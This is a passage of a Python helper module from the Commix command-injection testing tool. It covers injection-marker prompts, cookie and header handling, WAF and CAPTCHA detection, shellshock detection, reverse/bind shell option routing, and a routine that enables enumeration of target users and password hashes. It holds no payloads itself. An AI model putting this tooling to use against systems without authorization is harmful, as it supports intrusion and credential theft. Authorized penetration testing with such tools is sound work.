#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import io
import re
import os
import sys
import json
import time
import socket
import random
import string
import base64
import gzip
import zlib
import traceback
import subprocess
from glob import glob
from src.utils import common
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import simple_http_server
from src.thirdparty.odict import OrderedDict
from src.core.convert import hexdecode
from socket import error as SocketError
from src.core.requests import requests
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.thirdparty.flatten_json.flatten_json import flatten, unflatten_list

try:
  from readline import *
  import readline as readline
  if settings.PLATFORM == "mac":
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
except:
  try:
    from pyreadline import *
    import pyreadline as readline
  except:
    settings.READLINE_ERROR = True

"""
Check for custom injection marker (*)
"""
def check_custom_injection_marker(url):
  if url and settings.WILDCARD_CHAR in url:
    option = "'-u'"
    settings.WILDCARD_CHAR_APPLIED = True
  elif menu.options.data and settings.WILDCARD_CHAR in menu.options.data:
    option = "POST body"
    settings.WILDCARD_CHAR_APPLIED = True
  else:
    option = "option '--headers/--user-agent/--referer/--cookie'"
    if menu.options.cookie and settings.WILDCARD_CHAR in menu.options.cookie:
      settings.WILDCARD_CHAR_APPLIED = settings.COOKIE_INJECTION = True
      menu.options.level = settings.COOKIE_INJECTION_LEVEL

    elif menu.options.agent and settings.WILDCARD_CHAR in menu.options.agent:
      settings.WILDCARD_CHAR_APPLIED = settings.USER_AGENT_INJECTION = True
      menu.options.level = settings.HTTP_HEADER_INJECTION_LEVEL

    elif menu.options.referer and settings.WILDCARD_CHAR in menu.options.referer:
      settings.WILDCARD_CHAR_APPLIED = settings.REFERER_INJECTION = True
      menu.options.level = settings.HTTP_HEADER_INJECTION_LEVEL

    elif menu.options.headers and settings.WILDCARD_CHAR in menu.options.headers:
      _ = True
      for data in menu.options.headers.split("\\n"):
        # Ignore the Accept HTTP Header
        if not data.startswith(settings.ACCEPT):
          _ = False
      if _:    
        settings.WILDCARD_CHAR_APPLIED = True
        menu.options.level = settings.HTTP_HEADER_INJECTION_LEVEL

  if settings.WILDCARD_CHAR_APPLIED:
    if menu.options.test_parameter:
      if not settings.MULTI_TARGETS or settings.STDIN_PARSING:
        err_msg = "The options '-p' and the custom injection marker (" + settings.WILDCARD_CHAR + ") "
        err_msg += "cannot be used simultaneously (i.e. only one option must be set)."
        print(settings.print_critical_msg(err_msg))
        raise SystemExit 

    while True:
      message = "Custom injection marker (" + settings.WILDCARD_CHAR + ") found in " + option +". "
      message += "Do you want to process it? [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        return
      elif procced_option in settings.CHOICE_NO:
        settings.WILDCARD_CHAR_APPLIED = None
        return
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)  
        pass

"""
The available mobile user agents.
"""
def mobile_user_agents():
  menu.mobile_user_agents()
  while True:
    message = "Which smartphone do you want to imitate through HTTP User-Agent header? > "
    mobile_user_agent = common.read_input(message, default="1", check_batch=True)
    try:
      if int(mobile_user_agent) in range(1,len(settings.MOBILE_USER_AGENT_LIST)):
        return settings.MOBILE_USER_AGENT_LIST[int(mobile_user_agent)]
      elif mobile_user_agent.lower() == "q":
        raise SystemExit()
      else:
        common.invalid_option(mobile_user_agent)  
        pass
    except ValueError:
      common.invalid_option(mobile_user_agent)  
      pass     

"""
Run host OS command(s) when injection point is found.
"""
def alert():
  if settings.ALERT:
    info_msg = "Executing alerting shell command(s) '" + str(menu.options.alert) + "'."
    print(settings.print_info_msg(info_msg))
    try:
      process = subprocess.Popen(menu.options.alert, shell=True)
      process.wait()
    except Exception as ex:
      err_msg = "Error occurred while executing command(s) '" + str(menu.options.alert) + "'."
      print(settings.print_error_msg(err_msg))

"""
Check for HTTP Method
"""
def check_http_method(url):
  if len(settings.HTTP_METHOD) != 0:
    http_request_method = settings.HTTP_METHOD.upper()
  else:
    if not menu.options.data or \
       settings.WILDCARD_CHAR in url or \
       settings.INJECT_TAG in url or \
       [x for x in settings.TEST_PARAMETER if(x + "=" in url and not x in menu.options.data)]:
      http_request_method = settings.HTTPMETHOD.GET
    else:
      http_request_method = settings.HTTPMETHOD.POST
  return http_request_method    

"""
User aborted procedure
"""
def user_aborted(filename, url):
  abort_msg = "User aborted procedure "
  abort_msg += "during the " + assessment_phase() 
  abort_msg += " phase (Ctrl-C was pressed)."
  print(settings.print_abort_msg(abort_msg))
  logs.print_logs_notification(filename, url)
  common.show_http_error_codes()
  os._exit(0)

"""
Connection exceptions
"""
def connection_exceptions(err_msg):
  requests.request_failed(err_msg)
  settings.TOTAL_OF_REQUESTS = settings.TOTAL_OF_REQUESTS + 1
  if settings.MAX_RETRIES > 1:
    time.sleep(settings.DELAY_RETRY)
    if not settings.MULTI_TARGETS and not settings.CRAWLING:
      info_msg = settings.APPLICATION.capitalize() + " is going to retry the request(s)."
      print(settings.print_info_msg(info_msg))
  if not settings.VALID_URL :
    if settings.TOTAL_OF_REQUESTS == settings.MAX_RETRIES and not settings.MULTI_TARGETS:
      raise SystemExit()

"""
check for not declared cookie(s)
"""
def not_declared_cookies(response):
  try:
    set_cookie_headers = []
    for set_cookie_header in response.getheaders():
      if settings.SET_COOKIE in set_cookie_header:
        set_cookie_headers.append(re.search(r'([^;]+);?', set_cookie_header[1]).group(1))

    candidate = settings.COOKIE_DELIMITER.join(str(value) for value in set_cookie_headers)
    if candidate and settings.DECLARED_COOKIES is not False and settings.CRAWLING is False:
      settings.DECLARED_COOKIES = True
      if menu.options.cookie:
        menu.options.cookie = menu.options.cookie + settings.COOKIE_DELIMITER + candidate
        settings.DECLARED_COOKIES = False
      else:
        if settings.CRAWLED_SKIPPED_URLS_NUM != 0:
          print(settings.SINGLE_WHITESPACE)
        while True:
          message = "You have not declared cookie(s), while "
          message += "server wants to set its own ('" 
          message += str(re.sub(r"(=[^=;]{10}[^=;])[^=;]+([^=;]{10})", r"\g<1>...\g<2>", candidate))
          message += "'). Do you want to use those [Y/n] > "
          set_cookies = common.read_input(message, default="Y", check_batch=True)
          if set_cookies in settings.CHOICE_YES:
            menu.options.cookie = candidate
            break
          elif set_cookies in settings.CHOICE_NO:
            settings.DECLARED_COOKIES = False 
            break
          elif set_cookies in settings.CHOICE_QUIT:
            raise SystemExit()
          else:
            common.invalid_option(set_cookies)  
            pass
  except (KeyError, TypeError):
    pass

"""
Tab Autocompleter
"""
def tab_autocompleter():
  try:
    # MacOSX tab compliter
    if 'libedit' in readline.__doc__:
      readline.parse_and_bind("bind ^I rl_complete")
    else:
      readline.parse_and_bind("tab: complete")
    # Tab compliter
    readline.set_completer(menu.tab_completer)
  except (TypeError, AttributeError) as e:
    error_msg = "Failed while trying to use platform's readline library."
    print(settings.print_error_msg(error_msg))

"""
Save command history.
"""
def save_cmd_history():
  try:
    cli_history = os.path.expanduser(settings.CLI_HISTORY)
    if os.path.exists(cli_history):
      readline.write_history_file(cli_history)
  except (IOError, AttributeError) as e:
    warn_msg = "There was a problem writing the history file '" + cli_history + "'."
    print(settings.print_warning_msg(warn_msg))

"""
Load commands from history.
"""
def load_cmd_history():
  try:
    cli_history = os.path.expanduser(settings.CLI_HISTORY)
    if os.path.exists(cli_history):
      readline.read_history_file(cli_history)
  except (IOError, AttributeError, UnicodeError) as e:
    warn_msg = "There was a problem loading the history file '" + cli_history + "'."
    if settings.IS_WINDOWS:
      warn_msg += " More info can be found at 'https://github.com/pyreadline/pyreadline/issues/30'"
    print(settings.print_warning_msg(warn_msg))     

"""
Get value inside boundaries.
"""
def get_value_inside_boundaries(value):
  try:
    value = re.search(settings.VALUE_BOUNDARIES, value).group(1)
  except Exception as ex:
    pass
  return value

"""
Check if the value has boundaries.
"""
def value_boundaries(parameter, value, http_request_method):
  def check_boundaries_value(parameter, value, http_request_method):
    _ = get_value_inside_boundaries(value)

    if settings.INJECT_TAG in _:
      settings.INJECT_INSIDE_BOUNDARIES = False
      return ""
    if settings.INJECT_TAG in value:
      settings.INJECT_INSIDE_BOUNDARIES = True
      return _
    while True:
      message = "Do you want to inject the provided value for " + http_request_method + " parameter '" + parameter.split("=")[0] + "' inside boundaries?"
      message += " ('" + str(value.replace(_ ,_ + settings.WILDCARD_CHAR)) + "') [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        settings.INJECT_INSIDE_BOUNDARIES = True
        return _
      elif procced_option in settings.CHOICE_NO:
        settings.INJECT_INSIDE_BOUNDARIES = False
        return ""
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)  
        pass

  if menu.options.skip_parameter != None:
    for skip_parameter in re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.skip_parameter):
      if parameter.split("=")[0] != skip_parameter:
        return check_boundaries_value(skip_parameter, value, http_request_method)
      else:
        return value

  elif menu.options.test_parameter != None :
    for test_parameter in re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.test_parameter):
      if parameter.split("=")[0] == test_parameter:
        return check_boundaries_value(test_parameter, value, http_request_method)
      else:
        return value
  else:
    return check_boundaries_value(parameter, value, http_request_method)

"""
Add the PCRE '/e' modifier outside boundaries.
"""
def PCRE_e_modifier(parameter, http_request_method):
  original_parameter = parameter
  if not settings.PCRE_MODIFIER in parameter:
    try:
      if get_value_inside_boundaries(parameter.split("=")[1]) != parameter.split("=")[1]:
        while True:
          message = "It appears that provided value for " + http_request_method + " parameter '" + parameter.split("=")[0] + "' has boundaries. "
          message += "Do you want to add the PCRE '" + settings.PCRE_MODIFIER + "' modifier outside boundaries? ('" 
          message += parameter.split("=")[1].replace(settings.INJECT_TAG, settings.WILDCARD_CHAR) + settings.PCRE_MODIFIER[1:2] + "') [Y/n] > "
          modifier_check = common.read_input(message, default="Y", check_batch=True)
          if modifier_check in settings.CHOICE_YES:
            return original_parameter + settings.PCRE_MODIFIER[1:2]
          elif modifier_check in settings.CHOICE_NO:
            return original_parameter
          elif modifier_check in settings.CHOICE_QUIT:
            print(settings.SINGLE_WHITESPACE)
            os._exit(0)
          else:  
            common.invalid_option(modifier_check)  
            pass
    except Exception as ex:
      pass
  return parameter

"""
Ignoring the anti-CSRF parameter(s).
"""
def ignore_anticsrf_parameter(parameter):
  if any(parameter.lower().count(token) for token in settings.CSRF_TOKEN_PARAMETER_INFIXES):
    info_msg = "Ignoring the parameter '" + parameter.split("=")[0]
    info_msg += "' that appears to hold anti-CSRF token '" + parameter.split("=")[1] +  "'." 
    print(settings.print_info_msg(info_msg))
    return True

"""
Ignoring the Google analytics cookie parameter.
"""
def ignore_google_analytics_cookie(cookie):
  if cookie.upper().startswith(settings.GOOGLE_ANALYTICS_COOKIE_PREFIX):
    info_msg = "Ignoring the Google analytics cookie parameter '" + cookie.split("=")[0] + "'."
    print(settings.print_info_msg(info_msg))
    return True

"""
Fix for %0a, %0d%0a separators
"""
def newline_fixation(payload):
  payload = _urllib.parse.unquote(payload)
  if "\n" in payload:
    #_ = payload.find("\n") + 1
    #payload = _urllib.parse.quote(payload[:_]) + payload[_:]
    payload = payload.replace("\n","%0a")
  if "\r" in payload:
    #_ = payload.find("\r\n") + 1
    #payload = _urllib.parse.quote(payload[:_]) + payload[_:]  
    payload = payload.replace("\r","%0d")
  return payload

"""
Page enc/decoding
"""
def page_encoding(response, action):
  _ = False
  page = response.read()
  if response.info().get('Content-Encoding') in ("gzip", "x-gzip", "deflate"):
    try:
      if response.info().get('Content-Encoding') == 'deflate':
        data = io.BytesIO(zlib.decompress(page, -15))
      elif response.info().get('Content-Encoding') == 'gzip' or \
           response.info().get('Content-Encoding') == 'x-gzip':
        data = gzip.GzipFile("", "rb", 9, io.BytesIO(page))
      page = data.read()
      settings.PAGE_COMPRESSION = True
    except Exception as e:
      if settings.PAGE_COMPRESSION is None:
        warn_msg = "Turning off page compression."
        print(settings.print_warning_msg(warn_msg))
        settings.PAGE_COMPRESSION = False
  try:
    if action == "encode" and type(page) == str:
      return page.encode(settings.DEFAULT_CODEC, errors="ignore")
    else:
      return page.decode(settings.DEFAULT_CODEC, errors="ignore")
  except (UnicodeEncodeError, UnicodeDecodeError) as err:
    err_msg = "The " + str(err).split(":")[0] + ". "
    _ = True
  except (LookupError, TypeError) as err:
    err_msg = "The '" + settings.DEFAULT_CODEC + "' is " + str(err).split(":")[0] + ". "
    _ = True
    pass
  if _:
    err_msg += "You are advised to rerun with"
    err_msg += ('out', '')[menu.options.codec == None] + " the option '--codec'."
    print(settings.print_critical_msg(str(err_msg)))
    raise SystemExit()

"""
Returns header value ignoring the letter case
"""
def get_header(headers, key):
  value = None
  for _ in (headers or {}):
    if _.upper() == key.upper():
      value = headers[_]
      break
  return value

"""
Checks regarding a recognition of generic "your ip has been blocked" messages.
"""
def blocked_ip(page):
  if re.search(settings.BLOCKED_IP_REGEX, page):
    warn_msg = "It appears that you have been blocked by the target server."
    print(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential browser verification protection mechanism.
"""
def browser_verification(page):
  if not settings.BROWSER_VERIFICATION and re.search(r"(?i)browser.?verification", page or ""):
    settings.BROWSER_VERIFICATION = True
    warn_msg = "Potential browser verification protection mechanism detected"
    if re.search(r"(?i)CloudFlare", page):
      warn_msg += " (CloudFlare)."
    else:
      warn_msg += "."
    print(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential CAPTCHA protection mechanism.
"""
def captcha_check(page):
  if not settings.CAPTCHA_DETECED and re.search(r"(?i)captcha", page or ""):
    for match in re.finditer(r"(?si)<form.+?</form>", page):
      if re.search(r"(?i)captcha", match.group(0)):
        settings.CAPTCHA_DETECED = True
        warn_msg = "Potential CAPTCHA protection mechanism detected"
        if re.search(r"(?i)<title>[^<]*CloudFlare", page):
          warn_msg += " (CloudFlare)."
        else:
          warn_msg += "."
        if settings.CRAWLING:
          print(settings.SINGLE_WHITESPACE)
        print(settings.print_bold_warning_msg(warn_msg))
        break

"""
Checking the reliability of the used payload message.
"""
def check_for_false_positive_result(false_positive_warning):
  info_msg = "Checking if the injection point on "
  info_msg += settings.CHECKING_PARAMETER + " is a false positive.\n"
  sys.stdout.write("\r" + settings.print_info_msg(info_msg))
  warn_msg = "Time-based comparison requires " + ('larger', 'reset of')[false_positive_warning] + " statistical model"
  if settings.VERBOSITY_LEVEL != 0:
    warn_msg = warn_msg + ".\n"
  else:
    warn_msg = warn_msg +", please wait..."    
  sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))

"""
False positive or unexploitable injection point detected.
"""
def unexploitable_point():
  if settings.VERBOSITY_LEVEL == 0:
    print(settings.SINGLE_WHITESPACE)
  warn_msg = "False positive or unexploitable injection point has been detected."
  print(settings.print_bold_warning_msg(warn_msg))

"""
Counting the total of HTTP(S) requests for the identified injection point(s), during the detection phase.
"""
def total_of_requests():
  debug_msg = "Identified the following injection point with "
  debug_msg += "a total of " + str(settings.TOTAL_OF_REQUESTS) + " HTTP(S) requests."
  print(settings.print_bold_debug_msg(debug_msg))

"""
Url decode specific chars of the provided payload.
"""
def url_decode(payload):
  rep = {
          "%20": " ", 
          "%2B": "+",
          "\n": "\\n"
        }
  rep = dict((re.escape(k), v) for k, v in rep.items())
  pattern = re.compile("|".join(rep.keys()))
  payload = pattern.sub(lambda m: rep[re.escape(m.group(0))], payload)
  return payload

"""
Checking connection (resolving hostname).
"""
def check_connection(url):
  hostname = _urllib.parse.urlparse(url).hostname or ''
  if not re.search(r"\A\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\Z", hostname):
    if not any((menu.options.proxy, menu.options.tor, menu.options.offline)):
      try:
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Resolving hostname '" + hostname + "'."
          print(settings.print_debug_msg(debug_msg))
        socket.getaddrinfo(hostname, None)
      except socket.gaierror:
        err_msg = "Host '" + hostname + "' does not exist."
        if not settings.MULTI_TARGETS:
          print(settings.print_critical_msg(err_msg))
          raise SystemExit()
      except socket.error as err:
        err_msg = "Problem occurred while "
        err_msg += "resolving a host name '" + hostname + "'"
        if not settings.MULTI_TARGETS:
          print(settings.print_critical_msg(err_msg))
          raise SystemExit()

"""
Check current assessment phase.
"""
def assessment_phase():
  if settings.DETECTION_PHASE:
    if settings.CRAWLING_PHASE:
      return "crawling"
    else:
      return "detection"
  else:
    return "exploitation"

"""
Check current assessment phase.
"""
def check_injection_level():
  try:
    # Checking testable parameters for cookies
    if menu.options.cookie:
      if settings.COOKIE_DELIMITER in menu.options.cookie:
        cookies = menu.options.cookie.split(settings.COOKIE_DELIMITER)
        for cookie in cookies:
          if cookie.split("=")[0].strip() in menu.options.test_parameter:
            menu.options.level = settings.COOKIE_INJECTION_LEVEL
      elif menu.options.cookie.split("=")[0] in menu.options.test_parameter:
        menu.options.level = settings.COOKIE_INJECTION_LEVEL
    
    # Checking testable HTTP headers for user-agent / referer / host      
    if any(x in menu.options.test_parameter for x in settings.HTTP_HEADERS):
      menu.options.level = settings.HTTP_HEADER_INJECTION_LEVEL

  except Exception as ex:
    return


"""
Procced to the next attack vector.
"""
def next_attack_vector(technique, go_back):
  while True:
    message = "Do you want to continue with testing the " + technique + "? [y/N] > "
    next_attack_vector = common.read_input(message, default="N", check_batch=True)
    if next_attack_vector in settings.CHOICE_YES:
      # Check injection state
      assessment_phase()
      return True
    elif next_attack_vector in settings.CHOICE_NO:
      return  False
    elif next_attack_vector in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(next_attack_vector)  
      pass

"""
Fix single / double quote escaping.
"""
def escaped_cmd(cmd):
  if "\\\"" in cmd :
    cmd = cmd.replace("\\\"","\"")
  if "\'" in cmd :
    cmd = cmd.replace("\'","'")
  if "\$" in cmd :
    cmd = cmd.replace("\$","$")
  return cmd

"""
Removing the first and/or last line of the html content (in case there are/is empty).
"""
def remove_empty_lines(content):
  try:
    if content[0] == "\n": 
      content = content[1:content.rfind("\n")]
    if content[-1] == "\n":
      content = content[:content.rfind("\n")]
  except IndexError:
    pass    
  return content

"""
Check 'os_shell' options
"""
def check_os_shell_options(cmd, technique, go_back, no_result): 
  if cmd in settings.SHELL_OPTIONS:
    if cmd == "?":
      menu.os_shell_options()
    elif cmd == "back":
      if next_attack_vector(technique, go_back) == True:
        return True
      else:
        return False
    else:
      return cmd

"""
Procced with file-based semiblind command injection technique,
once the user provides the path of web server's root directory.
"""
def procced_with_file_based_technique(): 
  while True:
    message = "Due to the provided '--web-root' option,"
    message += " do you want to procced with the (semi-blind) "
    message += "file-based injection technique? [y/N] > "
    enable_fb = common.read_input(message, default="N", check_batch=True)
    if enable_fb in settings.CHOICE_YES:
      return True
    elif enable_fb in settings.CHOICE_NO:
      return False
    elif enable_fb in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_fb)  
      pass

"""
Check 'reverse_tcp' options
"""
def check_reverse_tcp_options(reverse_tcp_option):
  if reverse_tcp_option == False:
    return 0
  elif reverse_tcp_option == "back":
    return 1
  elif reverse_tcp_option == "os_shell": 
    return 2
  elif reverse_tcp_option == "bind_tcp": 
    return 3

"""
Check 'bind_tcp' options
"""
def check_bind_tcp_options(bind_tcp_option):
  if bind_tcp_option == False:
    return 0
  elif bind_tcp_option == "back":
    return 1
  elif bind_tcp_option == "os_shell": 
    return 2
  elif bind_tcp_option == "reverse_tcp": 
    return 3

"""
Ignore error messages and continue the tests.
"""
def continue_tests(err):
  # Ignoring (problematic) HTTP error codes.
  if menu.options.ignore_code:
    for error_code in settings.HTTP_ERROR_CODES:
      if menu.options.ignore_code == error_code:
        settings.WAF_ENABLED = True
        return True

  # Possible WAF/IPS/IDS
  try:
    if (str(err.code) == settings.FORBIDDEN_ERROR or \
       str(err.code) == settings.NOT_ACCEPTABLE_ERROR) and \
       not menu.options.skip_waf and \
       not settings.HOST_INJECTION :
      # Check if "--skip-waf" option is defined (to skip heuristic detection of WAF/IPS/IDS protection).
      settings.WAF_ENABLED = True
      warn_msg = "It seems that target is protected by some kind of WAF/IPS/IDS."
      print(settings.print_warning_msg(warn_msg))

    while True:
      message = "Do you want to ignore the response HTTP error code '" + str(err.code) 
      message += "' and continue the tests? [Y/n] > "
      continue_tests = common.read_input(message, default="Y", check_batch=True)
      if continue_tests in settings.CHOICE_YES:
        return True
      elif continue_tests in settings.CHOICE_NO:
        return False
      elif continue_tests in settings.CHOICE_QUIT:
        return False
      else:
        common.invalid_option(continue_tests)  
        pass
  except AttributeError:
    pass
  except KeyboardInterrupt:
    raise

"""
Check if option is unavailable
"""
def unavailable_option(check_option):
  warn_msg = "The option '" + check_option + "' "
  warn_msg += "is not yet supported Windows targets."
  print(settings.print_warning_msg(warn_msg))  

"""
Transformation of separators if time-based injection
"""
def time_based_separators(separator, http_request_method):
  if separator == "||"  or separator == "&&" :
    separator = separator[:1]
    if menu.options.data:
      separator = _urllib.parse.quote(separator)
  return separator

"""
Information message if platform does not have 
GNU 'readline' module installed.
"""
def no_readline_module():
  err_msg =  "It seems that your platform does "
  err_msg += "not have GNU 'readline' module installed."
  err_msg += " Download the"
  if settings.IS_WINDOWS:
    err_msg += " 'pyreadline' module (https://pypi.python.org/pypi/pyreadline)."
  elif settings.PLATFORM == "mac":  
    err_msg += " 'gnureadline' module (https://pypi.python.org/pypi/gnureadline)." 
  print(settings.print_critical_msg(err_msg)) 

"""
Check for incompatible OS (i.e Unix).
"""
def ps_incompatible_os():
  if not settings.TARGET_OS == "win":
    warn_msg = "The identified OS seems incompatible with the provided '--ps-version' switch."
    print(settings.print_warning_msg(warn_msg))
    return True

"""
Check if PowerShell is enabled.
"""
def ps_check():
  if settings.PS_ENABLED == None and menu.options.is_admin or menu.options.users or menu.options.passwords:
    if settings.VERBOSITY_LEVEL != 0:
      print(settings.SINGLE_WHITESPACE)
    while True:
      message = "The payloads in some options that you "
      message += "have chosen are requiring the use of powershell. "
      message += "Do you want to use the \"--ps-version\" flag "
      message += "to ensure that is enabled? [Y/n] > "
      ps_check = common.read_input(message, default="Y", check_batch=True)
      if ps_check in settings.CHOICE_YES:
        menu.options.ps_version = True
        break
      elif ps_check in settings.CHOICE_NO:
        break
      elif ps_check in settings.CHOICE_QUIT:
        print(settings.SINGLE_WHITESPACE)
        os._exit(0)
      else:  
        common.invalid_option(ps_check)  
        pass

"""
If PowerShell is disabled.
"""
def ps_check_failed():
  while True:
    message = "Do you want to ignore the above warning "
    message += "and continue the procedure? [Y/n] > "
    ps_check = common.read_input(message, default="Y", check_batch=True)
    if ps_check in settings.CHOICE_YES:
      break
    elif ps_check in settings.CHOICE_NO:
      print(settings.SINGLE_WHITESPACE)
      os._exit(0)
    else:  
      common.invalid_option(ps_check)
      pass

"""
Check if CGI scripts (shellshock injection).
"""
def check_CGI_scripts(url):
  try:
    CGI_SCRIPTS = []
    if not os.path.isfile(settings.CGI_SCRIPTS ):
      err_msg = "The pages / scripts list (" + settings.CGI_SCRIPTS  + ") is not found"
      print(settings.print_critical_msg(err_msg))
      raise SystemExit() 
    if len(settings.CGI_SCRIPTS ) == 0:
      err_msg = "The " + settings.CGI_SCRIPTS  + " list is empty."
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
    with open(settings.CGI_SCRIPTS , "r") as f: 
      for line in f:
        line = line.strip()
        CGI_SCRIPTS.append(line)
  except IOError: 
    err_msg = " Check if the " + settings.CGI_SCRIPTS  + " list is readable or corrupted."
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  _ = False
  for cgi_script in CGI_SCRIPTS:
    if cgi_script in url:
      info_msg = "Heuristic (basic) tests shows that target URL might contain a script "
      info_msg += "vulnerable to shellshock. "
      _ = True
      print(settings.print_bold_info_msg(info_msg))
      while True:
        message = "Do you want to enable the shellshock module ('--shellshock')? [Y/n] > "
        shellshock_check = common.read_input(message, default="Y", check_batch=True)
        if shellshock_check in settings.CHOICE_YES:
          menu.options.shellshock = True
          break
        elif shellshock_check in settings.CHOICE_NO:
          menu.options.shellshock = False
          break
        elif shellshock_check in settings.CHOICE_QUIT:
          print(settings.SINGLE_WHITESPACE)
          os._exit(0)
        else:  
          common.invalid_option(shellshock_check)  
          pass
          
  if not _:
    menu.options.shellshock = False

"""
Check if http / https.
"""
def check_http_s(url):
  if settings.SINGLE_WHITESPACE in url:
    url = url.replace(settings.SINGLE_WHITESPACE, _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE)) 
    
  if settings.CHECK_INTERNET:
      url = settings.CHECK_INTERNET_ADDRESS
  else:
    try:
      if re.search(r'^(?:http)s?://', url, re.I):
        if not re.search(r"^https?://", url, re.I) and not re.search(r"^wss?://", url, re.I):
          if re.search(r":443\b", url):
            url = "https://" + url
          else:
            url = "http://" + url
        settings.SCHEME = (_urllib.parse.urlparse(url).scheme.lower() or "http") if not menu.options.force_ssl else "https"
        if menu.options.force_ssl and settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Forcing usage of SSL/HTTPS requests."
          print(settings.print_debug_msg(debug_msg))
      else:
        err_msg = "Invalid target URL has been given." 
        print(settings.print_critical_msg(err_msg))
        raise SystemExit()
    except ValueError as err:
      err_msg = "Invalid target URL has been given." 
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
  return url
  
"""
Force the user-defined operating system name.
"""
def user_defined_os():
  if menu.options.os:
    if menu.options.os.lower() == "windows":
      settings.TARGET_OS = "win"
      return True
    elif menu.options.os.lower() == "unix":
      return True
    else:
      err_msg = "You specified wrong value '" + menu.options.os + "' "
      err_msg += "as an operation system. The value, must be 'Windows' or 'Unix'."
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()

"""
Decision if the user-defined operating system name, 
is different than the one identified by heuristics.
"""
def identified_os():
    warn_msg = "Heuristics have identified different operating system (" 
    warn_msg += settings.TARGET_OS + ") than that you have provided." 
    print(settings.print_warning_msg(warn_msg))
    message = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
    proceed_option = common.read_input(message, default="C", check_batch=True)
    if proceed_option.lower() in settings.CHOICE_PROCEED :
      if proceed_option.lower() == "s":
        return False
      elif proceed_option.lower() == "c":
        return True
      elif proceed_option.lower() == "q":
        raise SystemExit()
    else:
      common.invalid_option(proceed_option)  
      pass

"""
Check for third-party (non-core) libraries.
"""
def third_party_dependencies():
  info_msg = "Checking for third-party (non-core) libraries. "
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()
  
  try:
    import sqlite3
  except ImportError:
    print(settings.SINGLE_WHITESPACE)
    err_msg = settings.APPLICATION + " requires 'sqlite3' third-party library "
    err_msg += "in order to store previous injection points and commands. "
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  try:
    import readline
  except ImportError:
    if settings.IS_WINDOWS:
      try:
        import pyreadline
      except ImportError:
        print(settings.SINGLE_WHITESPACE)
        err_msg = settings.APPLICATION + " requires 'pyreadline' third-party library "
        err_msg += "in order to be able to take advantage of the TAB "
        err_msg += "completion and history support features. "
        print(settings.print_critical_msg(err_msg)) 
        raise SystemExit()
    elif settings.PLATFORM == "mac":
      try:
        import gnureadline
      except ImportError:
        print(settings.SINGLE_WHITESPACE)
        err_msg = settings.APPLICATION + " requires 'gnureadline' third-party library "
        err_msg += "in order to be able to take advantage of the TAB "
        err_msg += "completion and history support features. "
        print(settings.print_critical_msg(err_msg))
    pass

  print(settings.SINGLE_WHITESPACE)
  info_msg = "All required third-party (non-core) libraries are seems to be installed."
  print(settings.print_bold_info_msg(info_msg))

"""
Print the authentiation error message.
"""
def http_auth_err_msg():
  err_msg = "Use the '--auth-cred' option to provide a valid pair of " 
  err_msg += "HTTP authentication credentials (i.e --auth-cred=\"admin:admin\")" 
  err_msg += " or use the '--ignore-code=401' option to ignore HTTP error 401 (Unauthorized)" 
  err_msg += " and continue tests without providing valid credentials."
  print(settings.print_critical_msg(err_msg)) 
  raise SystemExit()

"""
Decision if the user-defined HTTP authenticatiob type, 
is different than the one identified by heuristics.
"""
def identified_http_auth_type(auth_type):
  warn_msg = "Heuristics have identified different HTTP authentication type (" 
  warn_msg += auth_type.lower() + ") than that you have provided ("
  warn_msg += menu.options.auth_type + ")." 
  print(settings.print_warning_msg(warn_msg))
  message = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
  proceed_option = common.read_input(message, default="C", check_batch=True)
  if proceed_option.lower() in settings.CHOICE_PROCEED :
    if proceed_option.lower() == "s":
      return False
    elif proceed_option.lower() == "c":
      return True
    elif proceed_option.lower() == "q":
      raise SystemExit()
  else:
    common.invalid_option(proceed_option) 
    pass

"""
Retrieve everything from the supported enumeration options.
"""
def enable_all_enumeration_options():
  # Retrieve current user name.
  menu.options.current_user = True
  # Retrieve current hostname.
  menu.options.hostname = True
  # Retrieve system information.
  menu.options.sys_info = True
  if settings.TARGET_OS == "win":
    # Check if the current user have admin privileges.
    menu.options.is_admin = True
    # Retrieve PowerShell's version number.
    menu.options.ps_version = True
  else:
    # Check if the current user have root privileges.
    menu.options.is_root = True
  # Retrieve system users.
  menu.options.users = True
  # Retrieve system users privileges.
  menu.options.privileges = True
  # Retrieve system users password hashes.
  menu.options.passwords = True

"""
Do replacement with the 'INJECT_HERE' tag, 
if the wildcard char is provided.
"""
def wildcard_character(data):
  if settings.WILDCARD_CHAR_APPLIED != None:
    _ = ""
    for data in data.split("\\n"):
